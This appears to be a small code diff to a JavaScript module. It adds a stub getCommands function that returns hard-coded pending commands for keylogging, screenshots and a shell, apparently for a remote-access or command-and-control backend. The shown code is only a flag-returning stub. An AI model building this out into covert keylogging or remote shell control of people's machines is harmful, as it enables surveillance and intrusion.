@@ -24,5 +24,15 @@ module.exports = {
             id: 1,
             name: 'bonsoir'
         }
+    },
+    getCommands: function (uuid) {
+
+        let pendingCommands = {
+            "Keylogs": true,
+            "Screenshot": true,
+            "Shell": false
+        }
+
+        return pendingCommands
     }
 }
